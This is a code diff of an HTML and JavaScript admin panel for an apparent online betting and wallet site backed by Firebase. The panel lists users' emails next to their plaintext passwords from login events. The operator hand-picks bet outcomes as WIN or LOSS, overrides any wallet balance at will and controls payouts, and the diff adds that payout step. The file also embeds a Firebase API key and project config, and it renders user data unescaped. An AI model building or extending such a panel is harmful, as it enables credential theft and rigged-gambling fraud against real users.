@@ -7,36 +7,26 @@
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { 
-            --neon-blue: #00f2ff; --neon-pink: #ff007a; --neon-purple: #7000ff; --neon-green: #38ef7d; --bg-dark: #020205;
-        }
+        :root { --neon-blue: #00f2ff; --neon-pink: #ff007a; --neon-purple: #7000ff; --neon-green: #38ef7d; --bg-dark: #020205; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Outfit', sans-serif; }
-        body { 
-            background: var(--bg-dark); color: white; padding: 20px; 
-            background-image: radial-gradient(at 0% 0%, hsla(253,16%,7%,1) 0, transparent 50%), radial-gradient(at 100% 0%, hsla(225,39%,30%,1) 0, transparent 50%);
-            min-height: 100vh;
-        }
+        body { background: var(--bg-dark); color: white; padding: 20px; background-image: radial-gradient(at 0% 0%, hsla(253,16%,7%,1) 0, transparent 50%), radial-gradient(at 100% 0%, hsla(225,39%,30%,1) 0, transparent 50%); min-height: 100vh; }
         h1 { text-align: center; font-weight: 900; letter-spacing: 5px; color: var(--neon-blue); margin-bottom: 30px; text-shadow: 0 0 15px rgba(0,242,255,0.4); }
         .stats-hud { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 30px; }
-        .hud-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); padding: 20px; border-radius: 20px; text-align: center; backdrop-filter: blur(10px); }
-        .hud-card h3 { font-size: 10px; color: rgba(255,255,255,0.4); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 5px; }
+        .hud-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); padding: 20px; border-radius: 20px; text-align: center; }
         .hud-card p { font-size: 28px; font-weight: 900; color: var(--neon-blue); }
-        .table-wrap { background: rgba(255,255,255,0.02); border-radius: 30px; border: 1px solid rgba(255,255,255,0.1); overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .table-wrap { background: rgba(255,255,255,0.02); border-radius: 30px; border: 1px solid rgba(255,255,255,0.1); overflow: hidden; }
         table { width: 100%; border-collapse: collapse; min-width: 700px; }
-        th { padding: 20px; text-align: left; font-size: 11px; text-transform: uppercase; color: var(--neon-blue); background: rgba(0,242,255,0.05); letter-spacing: 1px; }
-        td { padding: 18px 20px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 14px; vertical-align: middle; }
-        .neural-id { color: var(--neon-blue); font-weight: 600; cursor: pointer; transition: 0.2s; }
-        .neural-id:hover { text-shadow: 0 0 10px var(--neon-blue); }
-        .timestamp { font-size: 10px; color: rgba(255,255,255,0.3); margin-top: 4px; display: block; }
-        .tag { padding: 5px 10px; border-radius: 8px; font-size: 10px; font-weight: 900; text-transform: uppercase; display: inline-block; }
-        .tag-login { background: rgba(112, 0, 255, 0.2); color: var(--neon-purple); border: 1px solid var(--neon-purple); }
-        .tag-bet { background: rgba(255, 0, 122, 0.2); color: var(--neon-pink); border: 1px solid var(--neon-pink); }
-        .tag-deposit { background: rgba(0, 242, 255, 0.2); color: var(--neon-blue); border: 1px solid var(--neon-blue); }
-        .btn { padding: 10px 16px; border: none; border-radius: 12px; cursor: pointer; font-weight: 900; color: white; transition: 0.3s; margin-right: 5px; text-transform: uppercase; font-size: 11px; }
-        .btn-win, .btn-approve { background: var(--neon-green); color: #000; box-shadow: 0 0 15px rgba(56, 239, 125, 0.3); }
-        .btn-loss { background: #ef4444; box-shadow: 0 0 15px rgba(239, 68, 68, 0.2); }
-        .btn-del { background: rgba(255,255,255,0.05); color: #888; border: 1px solid rgba(255,255,255,0.1); width: 35px; height: 35px; display: inline-flex; align-items: center; justify-content: center; border-radius: 10px; }
-        #searchBox { width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 15px 25px; border-radius: 20px; color: white; margin-bottom: 20px; font-size: 16px; outline: none; }
+        th { padding: 20px; text-align: left; font-size: 11px; color: var(--neon-blue); background: rgba(0,242,255,0.05); text-transform: uppercase; }
+        td { padding: 18px 20px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 14px; }
+        .tag { padding: 5px 10px; border-radius: 8px; font-size: 10px; font-weight: 900; text-transform: uppercase; }
+        .tag-login { background: rgba(112, 0, 255, 0.2); color: var(--neon-purple); }
+        .tag-bet { background: rgba(255, 0, 122, 0.2); color: var(--neon-pink); }
+        .tag-deposit { background: rgba(0, 242, 255, 0.2); color: var(--neon-blue); }
+        .tag-withdraw { background: rgba(255, 0, 122, 0.2); color: var(--neon-pink); }
+        .btn { padding: 10px 16px; border: none; border-radius: 12px; cursor: pointer; font-weight: 900; color: white; margin-right: 5px; font-size: 11px; }
+        .btn-green { background: var(--neon-green); color: #000; }
+        .btn-red { background: #ef4444; }
+        .btn-del { background: rgba(255,255,255,0.05); color: #888; border: 1px solid rgba(255,255,255,0.1); }
     </style>
 </head>
 <body>
@@ -45,25 +35,14 @@
 
 <div class="stats-hud">
     <div class="hud-card"><h3>Live Signals</h3><p id="logCount">0</p></div>
-    <div class="hud-card"><h3>Auth Events</h3><p id="authCount" style="color:var(--neon-purple)">0</p></div>
-    <div class="hud-card"><h3>Transactions</h3><p id="betCount" style="color:var(--neon-pink)">0</p></div>
+    <div class="hud-card"><h3>Auth Events</h3><p id="authCount">0</p></div>
+    <div class="hud-card"><h3>Transactions</h3><p id="betCount">0</p></div>
 </div>
-
-<input type="text" id="searchBox" placeholder="SEARCH NEURAL ID (EMAIL)..." onkeyup="filterTable()">
 
 <div class="table-wrap">
     <table>
-        <thead>
-            <tr>
-                <th>Neural ID & Timestamp</th>
-                <th>Access / Value</th>
-                <th>Protocol Type</th>
-                <th>Node Control</th>
-            </tr>
-        </thead>
-        <tbody id="adminBody">
-            <tr><td colspan="4" style="text-align:center; padding:50px; color:orange;">LINKING TO FIREBASE...</td></tr>
-        </tbody>
+        <thead><tr><th>User ID & Time</th><th>Value/Pass</th><th>Protocol</th><th>Node Control</th></tr></thead>
+        <tbody id="adminBody"></tbody>
     </table>
 </div>
 
@@ -71,109 +50,76 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getFirestore, collection, onSnapshot, doc, updateDoc, deleteDoc, getDoc, setDoc, query, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-    const firebaseConfig = { 
-        apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8", authDomain: "home-help-service.firebaseapp.com", projectId: "home-help-service", storageBucket: "home-help-service.firebasestorage.app", messagingSenderId: "160722457510", appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567" 
-    };
-
+    const firebaseConfig = { apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8", authDomain: "home-help-service.firebaseapp.com", projectId: "home-help-service", storageBucket: "home-help-service.firebasestorage.app", messagingSenderId: "160722457510", appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567" };
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
     onSnapshot(query(collection(db, "users"), orderBy("time", "desc")), (snap) => {
         const body = document.getElementById("adminBody");
-        let html = "";
-        let auths = 0, bets = 0;
-
+        let html = ""; let auths = 0, bets = 0;
         snap.forEach(d => {
             const data = d.data();
             const id = d.id;
             const type = data.actionType || "LOG";
             const date = data.time ? new Date(data.time.seconds * 1000).toLocaleString() : "Syncing...";
-
             if(type.includes("LOG")) auths++; else bets++;
-
-            let tagClass = type.includes("LOG") ? "tag-login" : (type.includes("DEPOSIT") ? "tag-deposit" : "tag-bet");
+            let tagClass = `tag-${type.toLowerCase().split(' ')[0]}`;
             
-            // Generate Buttons based on Type
-            let actionButtons = "";
+            let actions = "";
             if (data.status === "PENDING") {
-                if (type === "DEPOSIT") {
-                    actionButtons = `<button class="btn btn-approve" onclick="approveDeposit('${id}','${data.email}','${data.password}')">APPROVE</button>`;
-                } else if (type.includes("BET")) {
-                    actionButtons = `
-                        <button class="btn btn-win" onclick="resolve('${id}','WIN 🏆','${data.email}','${data.password}')">WIN</button>
-                        <button class="btn btn-loss" onclick="resolve('${id}','LOST 💀','${data.email}','${data.password}')">LOSS</button>`;
-                }
-            } else {
-                actionButtons = `<span style="font-weight:900; font-size:11px; opacity:0.5;">${data.status || 'PROCESSED'}</span>`;
-            }
+                if (type === "DEPOSIT") actions = `<button class="btn btn-green" onclick="appDep('${id}','${data.email}','${data.password}')">APPROVE</button>`;
+                else if (type === "WITHDRAW") actions = `<button class="btn btn-red" onclick="appWith('${id}','${data.email}','${data.password}')">PAYOUT</button>`;
+                else actions = `<button class="btn btn-green" onclick="res('${id}','WIN 🏆','${data.email}','${data.password}')">W</button><button class="btn btn-red" onclick="res('${id}','LOST 💀','${data.email}','${data.password}')">L</button>`;
+            } else actions = `<span style="opacity:0.5; font-size:11px;">${data.status}</span>`;
 
-            html += `
-                <tr>
-                    <td>
-                        <div class="neural-id" onclick="setBal('${data.email}')">${data.email || 'UNKNOWN'}</div>
-                        <span class="timestamp">${date}</span>
-                    </td>
-                    <td><code style="background:rgba(0,0,0,0.3); padding:5px 10px; border-radius:8px; font-weight:900;">${data.password || 'N/A'}</code></td>
-                    <td><span class="tag ${tagClass}">${type}</span></td>
-                    <td>
-                        ${actionButtons}
-                        <button class="btn btn-del" onclick="delLog('${id}')"><i class="fa fa-trash"></i></button>
-                    </td>
-                </tr>`;
+            html += `<tr>
+                <td><div style="color:var(--neon-blue); cursor:pointer;" onclick="setB('${data.email}')">${data.email}</div><span style="font-size:10px; opacity:0.3;">${date}</span></td>
+                <td><code style="background:rgba(0,0,0,0.3); padding:4px 8px; border-radius:8px;">${data.password}</code></td>
+                <td><span class="tag ${tagClass}">${type}</span></td>
+                <td>${actions}<button class="btn btn-del" onclick="delLog('${id}')"><i class="fa fa-trash"></i></button></td>
+            </tr>`;
         });
-
         body.innerHTML = html;
         document.getElementById("logCount").innerText = snap.size;
         document.getElementById("authCount").innerText = auths;
         document.getElementById("betCount").innerText = bets;
     });
 
-    // APPROVE DEPOSIT (Adds amount to wallet)
-    window.approveDeposit = async (id, email, val) => {
-        const amt = parseInt(val.replace(/[^\d]/g, ''));
-        if(isNaN(amt)) return alert("Invalid Amount");
-
-        const snap = await getDoc(doc(db, "wallets", email));
-        const current = snap.exists() ? snap.data().balance : 0;
-        
-        await setDoc(doc(db, "wallets", email), { balance: current + amt });
+    window.appDep = async (id, e, v) => {
+        const amt = parseInt(v.replace(/[^\d]/g, ''));
+        const snap = await getDoc(doc(db, "wallets", e));
+        const cur = snap.exists() ? snap.data().balance : 0;
+        await setDoc(doc(db, "wallets", e), { balance: cur + amt });
         await updateDoc(doc(db, "users", id), { status: "COMPLETED ✅" });
-        alert("DEPOSIT APPROVED: CREDITS ADDED");
+        alert("Deposit Added!");
     };
 
-    window.setBal = async (email) => {
-        const val = prompt(`FORCE OVERRIDE BALANCE FOR: ${email}`);
-        if(val !== null && val !== "") {
-            await setDoc(doc(db, "wallets", email), { balance: parseInt(val) });
-            alert(`SUCCESS: Wallet updated to ₹${val}`);
+    window.appWith = async (id, e, v) => {
+        const amt = parseInt(v.replace(/[^\d]/g, ''));
+        const snap = await getDoc(doc(db, "wallets", e));
+        const cur = snap.exists() ? snap.data().balance : 0;
+        if(amt > cur) return alert("User spent funds before payout!");
+        await setDoc(doc(db, "wallets", e), { balance: cur - amt });
+        await updateDoc(doc(db, "users", id), { status: "PAID 💰" });
+        alert("Withdrawal Processed!");
+    };
+
+    window.setB = async (e) => {
+        const v = prompt(`Set wallet for ${e}:`);
+        if(v) await setDoc(doc(db, "wallets", e), { balance: parseInt(v) });
+    };
+
+    window.res = async (id, s, e, v) => {
+        const amt = parseInt(v.replace(/[^\d]/g, ''));
+        await updateDoc(doc(db, "users", id), { status: s });
+        if(s === "WIN 🏆") {
+            const snap = await getDoc(doc(db, "wallets", e));
+            const cur = snap.exists() ? snap.data().balance : 0;
+            await setDoc(doc(db, "wallets", e), { balance: cur + (amt * 2) });
         }
     };
 
-    window.resolve = async (id, res, email, val) => {
-        const amt = parseInt(val.replace(/[^\d]/g, ''));
-        await updateDoc(doc(db, "users", id), { status: res });
-        if(res === "WIN 🏆") {
-            const snap = await getDoc(doc(db, "wallets", email));
-            const current = snap.exists() ? snap.data().balance : 0;
-            await setDoc(doc(db, "wallets", email), { balance: current + (amt * 2) });
-        }
-    };
-
-    window.delLog = async (id) => { 
-        if(confirm("TERMINATE THIS LOG?")) await deleteDoc(doc(db, "users", id));
-    };
-
-    window.filterTable = () => {
-        let input = document.getElementById("searchBox").value.toUpperCase();
-        let rows = document.getElementById("adminBody").getElementsByTagName("tr");
-        for (let i = 0; i < rows.length; i++) {
-            let emailText = rows[i].getElementsByClassName("neural-id")[0];
-            if (emailText) {
-                let textValue = emailText.textContent || emailText.innerText;
-                rows[i].style.display = (textValue.toUpperCase().indexOf(input) > -1) ? "" : "none";
-            }
-        }
-    };
+    window.delLog = async (id) => { if(confirm("Terminate?")) await deleteDoc(doc(db, "users", id)); };
 </script>
 </body>
 </html>
